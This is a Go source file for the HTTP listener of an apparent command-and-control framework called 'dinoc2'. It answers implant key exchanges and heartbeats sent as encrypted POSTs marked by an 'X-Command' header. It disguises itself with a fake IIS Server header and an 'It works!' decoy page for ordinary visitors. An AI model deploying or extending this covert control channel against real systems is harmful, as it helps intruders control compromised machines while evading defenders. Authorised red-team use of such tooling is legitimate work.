package http

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/h2c"
	// "dinoc2/pkg/api" - removed to avoid import cycle
	"dinoc2/pkg/client"
	"dinoc2/pkg/crypto"
	"dinoc2/pkg/protocol"
)

// HTTPListener implements the Listener interface for HTTP/HTTP2 protocol
type HTTPListener struct {
	config      HTTPConfig
	server      *http.Server
	status      string
	statusLock  sync.RWMutex
	handlers    map[string]http.HandlerFunc
	apiHandler  http.Handler // API handler for handling API requests
}

// HTTPConfig holds configuration for the HTTP listener
type HTTPConfig struct {
	Address      string
	Port         int
	TLSCertFile  string
	TLSKeyFile   string
	UseHTTP2     bool
	AllowHTTP2H2C bool // Allow HTTP/2 cleartext (h2c)
	Options      map[string]interface{}
}

// NewHTTPListener creates a new HTTP listener
func NewHTTPListener(config HTTPConfig, apiHandler http.Handler) *HTTPListener {
	return &HTTPListener{
		config:     config,
		status:     "stopped",
		handlers:   make(map[string]http.HandlerFunc),
		apiHandler: apiHandler,
	}
}

// NewHTTPListenerWithoutAPI creates a new HTTP listener without an API handler
// This is for backward compatibility
func NewHTTPListenerWithoutAPI(config HTTPConfig) *HTTPListener {
	return NewHTTPListener(config, nil)
}

// Start implements the Listener interface
func (l *HTTPListener) Start() error {
	l.statusLock.Lock()
	defer l.statusLock.Unlock()

	if l.status == "running" {
		return fmt.Errorf("HTTP listener is already running")
	}

	// Create a new HTTP server
	addr := fmt.Sprintf("%s:%d", l.config.Address, l.config.Port)
	
	// Create a router/mux for handling requests
	mux := http.NewServeMux()
	
	// Register handlers
	for path, handler := range l.handlers {
		mux.HandleFunc(path, handler)
	}
	
	// If no handlers are registered, add a default one
	if len(l.handlers) == 0 {
		mux.HandleFunc("/", l.defaultHandler)
	}
	
	var handler http.Handler = mux
	
	// If HTTP/2 cleartext (h2c) is enabled, wrap the handler
	if l.config.AllowHTTP2H2C {
		h2s := &http2.Server{}
		handler = h2c.NewHandler(mux, h2s)
	}
	
	l.server = &http.Server{
		Addr:    addr,
		Handler: handler,
	}
	
	// Configure HTTP/2 if requested
	if l.config.UseHTTP2 {
		if err := http2.ConfigureServer(l.server, &http2.Server{}); err != nil {
			l.status = "error"
			return fmt.Errorf("failed to configure HTTP/2: %w", err)
		}
	}
	
	// Start the server in a goroutine
	go func() {
		var err error
		
		// Check if TLS is configured
		if l.config.TLSCertFile != "" && l.config.TLSKeyFile != "" {
			err = l.server.ListenAndServeTLS(l.config.TLSCertFile, l.config.TLSKeyFile)
		} else {
			err = l.server.ListenAndServe()
		}
		
		if err != nil && err != http.ErrServerClosed {
			l.statusLock.Lock()
			l.status = "error"
			l.statusLock.Unlock()
			fmt.Printf("Error starting HTTP listener: %v\n", err)
		}
	}()
	
	l.status = "running"
	return nil
}

// Stop implements the Listener interface
func (l *HTTPListener) Stop() error {
	l.statusLock.Lock()
	defer l.statusLock.Unlock()

	if l.status != "running" {
		return nil // Already stopped
	}

	// Create a context with timeout for graceful shutdown
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// Shutdown the server
	if l.server != nil {
		err := l.server.Shutdown(ctx)
		if err != nil {
			l.status = "error"
			return fmt.Errorf("error stopping HTTP listener: %w", err)
		}
	}

	l.status = "stopped"
	return nil
}

// Status implements the Listener interface
func (l *HTTPListener) Status() string {
	l.statusLock.RLock()
	defer l.statusLock.RUnlock()
	return l.status
}

// Configure implements the Listener interface
func (l *HTTPListener) Configure(config interface{}) error {
	l.statusLock.Lock()
	defer l.statusLock.Unlock()

	if l.status == "running" {
		return fmt.Errorf("cannot configure a running HTTP listener")
	}

	httpConfig, ok := config.(HTTPConfig)
	if !ok {
		return fmt.Errorf("invalid configuration type for HTTP listener")
	}

	l.config = httpConfig
	return nil
}

// RegisterHandler registers a handler for a specific path
func (l *HTTPListener) RegisterHandler(path string, handler http.HandlerFunc) {
	l.statusLock.Lock()
	defer l.statusLock.Unlock()
	
	l.handlers[path] = handler
}

// defaultHandler is the default HTTP handler
func (l *HTTPListener) defaultHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("Received HTTP request from %s: %s %s\n", r.RemoteAddr, r.Method, r.URL.Path)
	
	// Check if this is an API request
	if strings.HasPrefix(r.URL.Path, "/api/") {
		if l.apiHandler != nil {
			l.apiHandler.ServeHTTP(w, r)
			return
		}
	}
	
	// Set common headers to mimic a regular web server
	w.Header().Set("Server", "Microsoft-IIS/10.0")
	w.Header().Set("Content-Type", "text/html")
	
	// Check if this is a data-carrying request
	if r.Method == "POST" && r.Header.Get("X-Command") != "" {
		// Read the request body
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Error reading request body", http.StatusInternalServerError)
			return
		}
		
		// Create a protocol handler for processing the data
		protocolHandler := protocol.NewProtocolHandler()
		
		// Generate a unique session ID
		sessionID := crypto.GenerateSessionID()
		
		// Decode the packet to get the encryption algorithm
		packet, err := protocol.DecodePacket(body)
		if err != nil {
			fmt.Printf("Error decoding HTTP packet data: %v\n", err)
			http.Error(w, "Bad Request", http.StatusBadRequest)
			return
		}
		
		// Determine the encryption algorithm from the packet header
		var encAlgorithm string
		var cryptoAlgorithm crypto.Algorithm
		switch packet.Header.EncAlgorithm {
		case protocol.EncryptionAlgorithmAES:
			encAlgorithm = "aes"
			cryptoAlgorithm = crypto.AlgorithmAES
		case protocol.EncryptionAlgorithmChacha20:
			encAlgorithm = "chacha20"
			cryptoAlgorithm = crypto.AlgorithmChacha20
		default:
			encAlgorithm = "aes" // Default to AES if not specified
			cryptoAlgorithm = crypto.AlgorithmAES
		}
		
		fmt.Printf("Detected encryption algorithm for HTTP request: %s\n", encAlgorithm)
		
		// Create a session with the detected encryption algorithm
		err = protocolHandler.CreateSession(sessionID, cryptoAlgorithm)
		if err != nil {
			fmt.Printf("Error creating session for HTTP data with %s: %v\n", encAlgorithm, err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		
		// Get the client manager from the options if available
		if l.config.Options != nil {
			if clientManager, ok := l.config.Options["client_manager"]; ok {
				// Create a new client with the detected encryption algorithm
				config := client.DefaultConfig()
				config.ServerAddress = fmt.Sprintf("%s:%d", l.config.Address, l.config.Port)
				config.EncryptionAlg = encAlgorithm
				
				newClient, err := client.NewClient(config)
				if err != nil {
					fmt.Printf("Error creating client: %v\n", err)
				} else {
					// Register the client with the client manager
					if cm, ok := clientManager.(interface{ RegisterClient(*client.Client) string }); ok {
						clientID := cm.RegisterClient(newClient)
						fmt.Printf("Registered HTTP client with ID %s using %s encryption\n", clientID, encAlgorithm)
					}
				}
			}
		}
		
		// Handle packet based on type
		var responseData []byte
		
		switch packet.Header.Type {
		case protocol.PacketTypeKeyExchange:
			fmt.Printf("Received key exchange from %s via HTTP\n", r.RemoteAddr)
			// Create a response packet with the same session ID
			responsePacket := protocol.NewPacket(protocol.PacketTypeKeyExchange, []byte(string(sessionID)))
			responseData = protocol.EncodePacket(responsePacket)
			
		case protocol.PacketTypeHeartbeat:
			fmt.Printf("Received heartbeat from %s via HTTP\n", r.RemoteAddr)
			// Create a heartbeat response
			responsePacket := protocol.NewPacket(protocol.PacketTypeHeartbeat, []byte("pong"))
			responseData = protocol.EncodePacket(responsePacket)
			
		default:
			fmt.Printf("Received packet type %d from %s via HTTP\n", packet.Header.Type, r.RemoteAddr)
			// Echo back the packet for other types
			responseData = protocol.EncodePacket(packet)
		}
		
		// Clean up
		protocolHandler.RemoveSession(sessionID)
		
		// Send the response
		w.WriteHeader(http.StatusOK)
		w.Write(responseData)
	} else {
		// Regular request, send a generic response
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("<html><body><h1>It works!</h1></body></html>"))
	}
}

// CreateTLSConfig creates a TLS configuration for the HTTP server
func CreateTLSConfig(certFile, keyFile string) (*tls.Config, error) {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return nil, err
	}
	
	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}, nil
}
